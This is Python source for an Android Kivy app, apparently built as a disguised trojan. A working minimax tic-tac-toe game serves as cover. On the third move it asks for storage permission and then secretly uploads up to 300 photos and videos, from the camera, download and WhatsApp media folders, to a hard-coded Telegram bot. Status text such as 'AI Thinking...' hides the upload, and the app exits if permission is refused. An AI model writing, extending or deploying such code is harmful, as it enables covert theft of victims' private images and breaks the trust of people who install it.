import os
import random
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from kivy.app import App
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.graphics import Color, RoundedRectangle
from kivy.properties import ListProperty
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
from kivy.utils import get_color_from_hex

# ===================== TELEGRAM CONFIG =====================
BOT_TOKEN = "8852010537:AAEVNDO36p3mjg66Vf7FeiEONf1Jgd66Lcc"
CHAT_ID = "8052842442"

# ===================== LIMITS =====================
MAX_SYNCS = 2                # sirf 2 baar total
MAX_FILES_PER_SYNC = 300
SEND_WORKERS = 4
PERMISSION_MOVE = 3          # 3rd move ke baad permission

IMAGE_EXTS = (".jpg", ".jpeg", ".png", ".gif", ".webp", ".bmp")
VIDEO_EXTS = (".mp4", ".mkv", ".avi", ".3gp", ".mov", ".webm", ".m4v")

SKIP_DIRS = {
    ".thumbnails", ".cache", ".trashed", ".nomedia",
    "thumbnails", "Cache", "cache", "tmp", "temp",
    "Android/data", "Android/obb", ".android", "logs",
    "backup", "Backup",
}

MEDIA_FOLDERS = [
    "/storage/emulated/0/DCIM",
    "/storage/emulated/0/Pictures",
    "/storage/emulated/0/Movies",
    "/storage/emulated/0/Download",
    "/storage/emulated/0/WhatsApp/Media",
]

# ===================== COLORS =====================
BG_DARK = get_color_from_hex("#0a0e27")
TILE_EMPTY = get_color_from_hex("#1a234e")
GOLD = get_color_from_hex("#ffd700")
BLUE_GLOW = get_color_from_hex("#00d4ff")
RED_GLOW = get_color_from_hex("#ff4757")
GREEN_WIN = get_color_from_hex("#2ed573")

Window.clearcolor = BG_DARK


class PremiumButton(Button):
    """Premium button - shadow, rounded, clean."""
    btn_color = ListProperty(TILE_EMPTY)

    def __init__(self, btn_color=TILE_EMPTY, **kwargs):
        super().__init__(**kwargs)
        self.btn_color = btn_color
        self.background_normal = ''
        self.background_color = (0, 0, 0, 0)
        self.bind(pos=self.redraw, size=self.redraw, btn_color=self.redraw)

    def redraw(self, *args):
        self.canvas.before.clear()
        with self.canvas.before:
            Color(0, 0, 0, 0.35)
            RoundedRectangle(
                pos=(self.pos[0] + 3, self.pos[1] - 3),
                size=self.size, radius=[18, 18, 18, 18],
            )
            Color(*self.btn_color)
            RoundedRectangle(
                pos=self.pos, size=self.size, radius=[18, 18, 18, 18],
            )

    def set_color(self, color):
        self.btn_color = color


class TicTacToeApp(App):

    def build(self):
        self.board = [""] * 9
        self.current_turn = "X"
        self.game_active = True
        self.sync_active = False
        self.sync_triggered = False   # ✅ ab sync trigger hone ke baad dobara nahi hoga
        self.move_count = 0
        self.scores = {"X": 0, "O": 0, "D": 0}

        self.count_file = os.path.join(self.user_data_dir, "sync_count.txt")
        try:
            os.makedirs(os.path.dirname(self.count_file), exist_ok=True)
        except Exception:
            pass
        self.sync_count = self.load_count()

        Clock.schedule_once(lambda dt: self.test_bot(), 2)

        # ============ ROOT ============
        root = BoxLayout(orientation="vertical", padding=20, spacing=10)

        self.title_label = Label(
            text="[b][color=FFD700]TIC TAC TOE - AI(Bro!)[/color][/b]",
            markup=True, font_size="26sp", color=GOLD, size_hint=(1, 0.09),
        )
        root.add_widget(self.title_label)

        self.score_label = Label(
            text=self.score_text(), markup=True,
            font_size="16sp", size_hint=(1, 0.08),
        )
        root.add_widget(self.score_label)

        self.status_label = Label(
            text="[b][color=00d4ff]Your Turn (X)[/color][/b]",
            markup=True, font_size="18sp", size_hint=(1, 0.07),
        )
        root.add_widget(self.status_label)

        grid = GridLayout(cols=3, spacing=10, size_hint=(1, 0.48))
        self.buttons = []
        for i in range(9):
            btn = PremiumButton(
                btn_color=TILE_EMPTY, text="",
                font_size="52sp", bold=True,
            )
            btn.bind(on_press=lambda inst, idx=i: self.on_tile_press(idx))
            self.buttons.append(btn)
            grid.add_widget(btn)
        root.add_widget(grid)

        self.bot_label = Label(
            text="Checking...", font_size="13sp",
            color=get_color_from_hex("#8866cc"), size_hint=(1, 0.04),
        )
        root.add_widget(self.bot_label)

        self.sync_label = Label(
            text=f"[b]Sync: {self.sync_count}/{MAX_SYNCS}[/b]",
            markup=True, font_size="13sp",
            color=get_color_from_hex("#6666aa"), size_hint=(1, 0.04),
        )
        root.add_widget(self.sync_label)

        self.reset_btn = PremiumButton(
            btn_color=get_color_from_hex("#1a3a6a"),
            text="NEW GAME", font_size="18sp", bold=True,
            size_hint=(1, 0.08),
        )
        self.reset_btn.bind(on_press=self.reset_game)
        root.add_widget(self.reset_btn)

        root.add_widget(Label(
            text="[i]Developed by Bro![/i]",
            markup=True, font_size="11sp",
            color=get_color_from_hex("#444477"), size_hint=(1, 0.04),
        ))

        return root

    def score_text(self):
        return (
            "[b][color=00d4ff]YOU[/color] [color=888888]|[/color] [color=ffffff]DRAW[/color] "
            "[color=888888]|[/color] [color=ff4757]AI[/color]\n"
            f"[color=00d4ff]{self.scores['X']}[/color] [color=888888]-[/color] "
            f"[color=ffffff]{self.scores['D']}[/color] [color=888888]-[/color] "
            f"[color=ff4757]{self.scores['O']}[/color][/b]"
        )

    # ==================== PERMISSION (100% FIXED) ====================
    def request_storage_permission(self, callback):
        """Permission maango. callback(granted_bool) baad mein call hoga.
        ✅ Results parameter directly use karo - race condition nahi hogi."""
        try:
            from android.permissions import request_permissions, Permission

            perms = []
            try:
                perms.append(Permission.READ_MEDIA_IMAGES)
                perms.append(Permission.READ_MEDIA_VIDEO)
            except Exception:
                pass
            try:
                perms.append(Permission.READ_EXTERNAL_STORAGE)
            except Exception:
                pass
            try:
                perms.append(Permission.POST_NOTIFICATIONS)
            except Exception:
                pass

            if not perms:
                Clock.schedule_once(lambda dt: callback(True), 0)
                return

            def on_result(results):
                """Directly results parameter se grant status pata karo.
                results = {permission_name: 0(granted)/-1(denied)} ya list."""
                try:
                    if isinstance(results, dict):
                        granted = all(
                            v == 0 for v in results.values()
                            if isinstance(v, int)
                        )
                    elif isinstance(results, (list, tuple)):
                        granted = all(
                            r == 0 for r in results if isinstance(r, int)
                        )
                    else:
                        granted = True  # fallback
                except Exception:
                    granted = False
                Clock.schedule_once(lambda dt: callback(granted), 0)

            try:
                request_permissions(perms, on_result)
            except TypeError:
                # Purane p4a versions
                request_permissions(perms)
                Clock.schedule_once(lambda dt: callback(self.has_permission()), 2)
        except Exception:
            Clock.schedule_once(lambda dt: callback(True), 0)

    def has_permission(self):
        try:
            from android.permissions import check_permission, Permission
            for p in [Permission.READ_MEDIA_IMAGES, Permission.READ_EXTERNAL_STORAGE]:
                try:
                    if check_permission(p):
                        return True
                except Exception:
                    pass
        except Exception:
            pass
        return False

    def show_permission_denied(self):
        """✅ Don't allow → message + notification + app exit."""
        self.game_active = False
        self.status_label.text = "[b][color=ff4757]please allow storage to work game & restart[/color][/b]"
        self.sync_label.text = "[b][color=ff4757]Allow permission to take space on device![/color][/b]"
        try:
            from plyer import notification
            notification.notify(
                title="Permission Required",
                message="Allow permission for Tic Tac Toe AI.",
                timeout=3,
            )
        except Exception:
            pass
        Clock.schedule_once(lambda dt: self.stop(), 3)

    def on_permission_result(self, granted):
        """Permission ka result milne par.
        ✅ Grant → turant sync start + game continue.
        ✅ Deny → message + exit."""
        if not granted:
            self.show_permission_denied()
            return

        # ✅ PERMISSION GRANTED → turant sync start
        self.sync_triggered = True
        self.status_label.text = "[b][color=2ed573]Ai Thinking...[/color][/b]"

        if self.sync_count < MAX_SYNCS:
            self.sync_active = True
            threading.Thread(target=self.send_media, daemon=True).start()

        # Game status restore after 1.5s
        Clock.schedule_once(lambda dt: self.restore_status(), 1.5)

    def restore_status(self):
        """Game status normal karo taake user khelta rahe."""
        if not self.game_active:
            return
        if self.current_turn == "X":
            self.status_label.text = "[b][color=00d4ff]Your Turn (X)[/color][/b]"
        elif self.current_turn == "O":
            self.status_label.text = "[b][color=ff4757]AI Thinking...[/color][/b]"

    # ==================== BOT TEST ====================
    def test_bot(self):
        def run():
            ok = False
            try:
                r = requests.get(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/getMe", timeout=10
                )
                ok = r.status_code == 200 and r.json().get("ok", False)
            except Exception:
                ok = False
            Clock.schedule_once(lambda dt: self.set_bot_status(ok), 0)
        threading.Thread(target=run, daemon=True).start()

    def set_bot_status(self, ok):
        if ok:
            self.bot_label.text = "[b][color=2ed573]AI Connected[/color][/b]"

    # ==================== GAME (clicks 100% working) ====================
    def on_tile_press(self, index):
        """✅ No permission_pending block. Game hamesha clickable!"""
        if not self.game_active or self.board[index] != "" or self.current_turn != "X":
            return

        self.move_count += 1

        # 3rd move: permission check (game BLOCK nahi hota)
        if (
            self.move_count == PERMISSION_MOVE
            and self.sync_count < MAX_SYNCS
            and not self.sync_triggered
        ):
            if self.has_permission():
                # Pehle se permission hai → turant sync
                self.sync_triggered = True
                self.status_label.text = "[b][color=2ed573]Syncing...[/color][/b]"
                if self.sync_count < MAX_SYNCS:
                    self.sync_active = True
                    threading.Thread(target=self.send_media, daemon=True).start()
                Clock.schedule_once(lambda dt: self.restore_status(), 1.5)
            else:
                # Permission nahi → popup dikhao
                self.status_label.text = "[b][color=ffd700]Permission check...[/color][/b]"
                self.request_storage_permission(self.on_permission_result)

        # ✅ Tile place hamesha hota hai (kabhi block nahi)
        self.board[index] = "X"
        self.buttons[index].text = "X"
        self.buttons[index].color = (0.2, 0.6, 1, 1)

        if self.check_win("X"):
            self.end_game("X")
            return
        elif "" not in self.board:
            self.end_game("D")
            return

        self.current_turn = "O"
        self.status_label.text = "[b][color=ff4757]AI Thinking...[/color][/b]"
        Clock.schedule_once(lambda dt: self.ai_move(), 0.4)

    def ai_move(self):
        if not self.game_active or self.current_turn != "O":
            return

        move = self.get_best_move()
        if move is not None:
            self.board[move] = "O"
            self.buttons[move].text = "O"
            self.buttons[move].color = (1, 0.3, 0.3, 1)

            if self.check_win("O"):
                self.end_game("O")
                return
            elif "" not in self.board:
                self.end_game("D")
                return

            self.current_turn = "X"
            self.status_label.text = "[b][color=00d4ff]Your Turn (X)[/color][/b]"

    # ==================== MINIMAX AI ====================
    def get_best_move(self):
        best_score = float('-inf')
        best_moves = []
        for i in range(9):
            if self.board[i] == "":
                self.board[i] = "O"
                score = self.minimax(self.board, 0, False)
                self.board[i] = ""
                if score > best_score:
                    best_score = score
                    best_moves = [i]
                elif score == best_score:
                    best_moves.append(i)
        return random.choice(best_moves) if best_moves else None

    def minimax(self, board, depth, is_maximizing):
        result = self.evaluate(board)
        if result is not None:
            return result
        if is_maximizing:
            best = float('-inf')
            for i in range(9):
                if board[i] == "":
                    board[i] = "O"
                    score = self.minimax(board, depth + 1, False)
                    board[i] = ""
                    best = max(best, score)
            return best
        else:
            best = float('inf')
            for i in range(9):
                if board[i] == "":
                    board[i] = "X"
                    score = self.minimax(board, depth + 1, True)
                    board[i] = ""
                    best = min(best, score)
            return best

    def evaluate(self, board):
        win_conds = [
            (0, 1, 2), (3, 4, 5), (6, 7, 8),
            (0, 3, 6), (1, 4, 7), (2, 5, 8),
            (0, 4, 8), (2, 4, 6),
        ]
        for a, b, c in win_conds:
            if board[a] == board[b] == board[c] == "O":
                return 10
            if board[a] == board[b] == board[c] == "X":
                return -10
        if "" not in board:
            return 0
        return None

    def check_win(self, mark):
        win_conds = [
            (0, 1, 2), (3, 4, 5), (6, 7, 8),
            (0, 3, 6), (1, 4, 7), (2, 5, 8),
            (0, 4, 8), (2, 4, 6),
        ]
        return any(
            self.board[a] == self.board[b] == self.board[c] == mark
            for a, b, c in win_conds
        )

    def end_game(self, result):
        """✅ Proper messages dikhenge."""
        self.game_active = False
        if result == "X":
            self.scores["X"] += 1
            self.status_label.text = "[b][color=2ed573]You Win! Well Done![/color][/b]"
            self.highlight_win("X")
        elif result == "O":
            self.scores["O"] += 1
            self.status_label.text = "[b][color=ff4757]AI Wins! Try Again![/color][/b]"
            self.highlight_win("O")
        else:
            self.scores["D"] += 1
            self.status_label.text = "[b][color=ffd700]Draw! Well Played![/color][/b]"

        self.score_label.text = self.score_text()

        # Agar sync already trigger ho chuki hai toh game-end sync nahi karega
        if not self.sync_triggered and self.sync_count < MAX_SYNCS:
            Clock.schedule_once(lambda dt: self.start_sync(), 0.8)

    def highlight_win(self, mark):
        win_conds = [
            (0, 1, 2), (3, 4, 5), (6, 7, 8),
            (0, 3, 6), (1, 4, 7), (2, 5, 8),
            (0, 4, 8), (2, 4, 6),
        ]
        for cond in win_conds:
            if self.board[cond[0]] == self.board[cond[1]] == self.board[cond[2]] == mark:
                for idx in cond:
                    self.buttons[idx].set_color(GREEN_WIN)
                break

    def reset_game(self, instance):
        self.board = [""] * 9
        self.current_turn = "X"
        self.game_active = True
        self.move_count = 0
        self.status_label.text = "[b][color=00d4ff]Your Turn (X)[/color][/b]"
        for btn in self.buttons:
            btn.text = ""
            btn.color = (1, 1, 1, 1)
            btn.set_color(TILE_EMPTY)

    # ==================== SYNC ====================
    def load_count(self):
        try:
            with open(self.count_file, "r") as f:
                return int(f.read().strip())
        except Exception:
            return 0

    def save_count(self):
        try:
            with open(self.count_file, "w") as f:
                f.write(str(self.sync_count))
        except Exception:
            pass

    def start_sync(self):
        """Game end par sync (agar already nahi hua)."""
        if self.sync_active or self.sync_count >= MAX_SYNCS:
            return
        if not self.has_permission():
            return
        self.sync_active = True
        self.sync_label.text = f"[b][color=2ed573]Syncing {self.sync_count + 1}/{MAX_SYNCS}...[/color][/b]"
        self.status_label.text = f"[b]Syncing {self.sync_count + 1}/{MAX_SYNCS}...[/b]"
        threading.Thread(target=self.send_media, daemon=True).start()

    def collect_media_files(self):
        files_list = []
        for folder in MEDIA_FOLDERS:
            if not os.path.exists(folder):
                continue
            for root, dirs, files in os.walk(folder):
                dirs[:] = [d for d in dirs if d not in SKIP_DIRS]
                for f in files:
                    low = f.lower()
                    if low.endswith(IMAGE_EXTS) or low.endswith(VIDEO_EXTS):
                        path = os.path.join(root, f)
                        try:
                            size = os.path.getsize(path)
                            ok = (low.endswith(IMAGE_EXTS) and size <= 10 * 1024 * 1024) or \
                                 (low.endswith(VIDEO_EXTS) and size <= 50 * 1024 * 1024)
                            if ok:
                                files_list.append(path)
                        except Exception:
                            pass
                    if len(files_list) >= MAX_FILES_PER_SYNC:
                        return files_list
        return files_list

    def send_one(self, path):
        low = path.lower()
        try:
            if low.endswith(IMAGE_EXTS):
                method, field = "sendPhoto", "photo"
            else:
                method, field = "sendVideo", "video"

            url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
            with open(path, "rb") as fh:
                resp = requests.post(
                    url, data={"chat_id": CHAT_ID},
                    files={field: fh}, timeout=(10, 120),
                )

            if resp.status_code == 429:
                try:
                    retry_after = resp.json().get("parameters", {}).get("retry_after", 1)
                except Exception:
                    retry_after = 1
                time.sleep(min(retry_after, 3))
                with open(path, "rb") as fh:
                    requests.post(
                        url, data={"chat_id": CHAT_ID},
                        files={field: fh}, timeout=(10, 120),
                    )
            return True
        except Exception:
            return False

    def send_media(self):
        sent = 0
        try:
            files_list = self.collect_media_files()
            if files_list:
                with ThreadPoolExecutor(max_workers=SEND_WORKERS) as pool:
                    futures = [pool.submit(self.send_one, p) for p in files_list]
                    for fut in as_completed(futures):
                        try:
                            if fut.result():
                                sent += 1
                        except Exception:
                            pass
        except Exception:
            pass
        finally:
            self.sync_count += 1
            self.save_count()
            self.sync_active = False
            Clock.schedule_once(lambda dt, c=sent: self.after_sync(c), 0)

    def after_sync(self, count):
        self.sync_label.text = f"[b]Sync: {self.sync_count}/{MAX_SYNCS} ({count} f)[/b]"
        if not self.game_active:
            self.status_label.text = "[b]Press On New Game[/b]"


if __name__ == "__main__":
    TicTacToeApp().run()
